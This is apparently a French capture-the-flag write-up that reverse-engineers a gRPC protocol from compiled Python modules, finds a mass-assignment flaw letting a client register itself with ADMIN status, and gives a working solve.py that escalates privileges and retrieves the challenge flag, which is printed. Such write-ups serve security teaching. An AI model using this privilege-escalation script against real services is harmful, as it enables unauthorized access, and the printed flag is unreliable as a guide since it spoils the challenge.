# Résolution du Challenge "Session Sécurisée Hostile"

Ce document détaille la démarche technique nécessaire pour résoudre le challenge de type exploitation intitulé "Session Sécurisée Hostile".

## Description du Challenge

*   **Titre** : Session Sécurisée Hostile
*   **Catégorie** : Exploitation
*   **Objectif** : Analyser un protocole gRPC propriétaire et exploiter une vulnérabilité pour récupérer un flag sur un serveur distant.
*   **Contraintes** : Les sessions serveur sont réinitialisées toutes les 60 secondes.
*   **Fichiers fournis** : Une archive contenant des modules Python compilés (`.so`) pour Linux (architecture x86_64) et un script d'exemple `test-client.py`.

## Analyse Technique

### 1. Environnement et Dépendances

Les fichiers fournis sont des extensions CPython compilées spécifiquement pour Python 3.11 (`cpython-311`). Leur exécution nécessite impérativement :
*   Un système d'exploitation Linux (ou WSL/Docker).
*   L'interpréteur Python version 3.11.
*   Les bibliothèques `grpcio` et `protobuf`.

Si la machine d'analyse dispose d'une version différente de Python (ex: 3.12 ou 3.13), l'importation des modules échouera. L'utilisation d'un conteneur Docker est la solution recommandée pour garantir la compatibilité.

### 2. Rétro-ingénierie du Protocole

L'analyse des chaînes de caractères présentes dans les bibliothèques partagées (`poskaship_pb2.*.so`) permet de reconstituer la structure des messages gRPC.

Commande d'analyse :
```bash
strings poskaship_pb2.cpython-311-x86_64-linux-gnu.so | grep -iE "status|username|password"
```

Informations extraites :
*   **Service** : `PoskaShip`
*   **Méthodes RPC** : `Register`, `Login`, `GetFlag`.
*   **Message `Profile`** : Contient les champs `username`, `password` et `status`.
*   **Constantes** : Présence de `GUEST` (valeur 0) et `ADMIN` (valeur 2).
*   **Message `EmptyRequest`** : Requis pour certaines méthodes ne prenant pas d'arguments.

### 3. Identification de la Vulnérabilité

Une tentative d'inscription standard (avec le statut par défaut `GUEST`) entraîne une erreur serveur explicite :
> `Exception calling application: Current level is 0, need at least 2`

Cette erreur indique que l'action requiert un niveau de privilège supérieur ou égal à 2. La vulnérabilité réside dans la possibilité pour le client de soumettre arbitrairement le champ `status` lors de la création du profil (Mass Assignment / Insecure Direct Object Reference lors de la création), permettant une élévation de privilèges immédiate.

## Exploitation

Le script de résolution automatise les étapes suivantes :
1.  Connexion au canal gRPC sécurisé (TLS).
2.  Génération d'identifiants aléatoires.
3.  Envoi d'une requête `Register` en forçant le champ `status` à la valeur `2` (ADMIN).
4.  Authentification via `Login` avec les identifiants créés.
5.  Appel de la méthode `GetFlag` et lecture du flux de réponse.

### Script de résolution (`solve.py`)

```python
#! /usr/bin/env python3
import sys
import grpc
import argparse
import random
import string

try:
    from client import create_client_channel, PoskaShipStub
    import poskaship_pb2
except ImportError as e:
    print(f"Erreur d'import : {e}")
    sys.exit(1)

def get_random_string(length=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def solve(remote_host):
    print(f"[*] Cible : {remote_host}")
    
    # 1. Définition des classes gRPC
    ProfileMsg = getattr(poskaship_pb2, 'Profile')
    EmptyMsg = getattr(poskaship_pb2, 'EmptyRequest')
    
    # 2. Préparation de l'élévation de privilèges (Status ADMIN = 2)
    try:
        target_status = getattr(poskaship_pb2, 'ADMIN')
    except AttributeError:
        target_status = 2 

    username = get_random_string()
    password = get_random_string()
    print(f"[*] Credentials : {username} / {password} (Status: {target_status})")

    with create_client_channel(remote_host, tls=True) as cc:
        stub = PoskaShipStub(*cc)

        try:
            # Inscription avec élévation de privilèges
            print("[*] Register (Admin)...")
            req = ProfileMsg(username=username, password=password, status=target_status)
            stub.Register(req)
            print("    [+] OK")

            # Connexion
            print("[*] Login...")
            req = ProfileMsg(username=username, password=password)
            stub.Login(req)
            print("    [+] OK")

            # Récupération du flag
            print("[*] GetFlag...")
            req = EmptyMsg()
            responses = stub.GetFlag(req)
            
            # Lecture du flux
            for r in responses:
                print(r, end='') 

        except Exception as e:
            print(f"[-] Erreur : {e}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('remote', nargs='?', default='www.passetonhack.fr')
    args = parser.parse_args()
    solve(args.remote)
```

### Exécution via Docker

Pour exécuter le script dans un environnement Python 3.11 propre :

```bash
docker run -it --rm \
    -v $(pwd):/app \
    -w /app \
    python:3.11-bookworm \
    bash -c "pip install grpcio protobuf && python solve.py"
```

## Démonstration

La vidéo suivante illustre l'exécution du script et l'obtention du flag sur un environnement Kali Linux.

<video controls src="Flag-Session-Sécurisée-Hostile.mp4" title="Démonstration de résolution"></video>

**Flag obtenu** : `FLAG{94c49e9baae50e0218ca6430e43de180}`
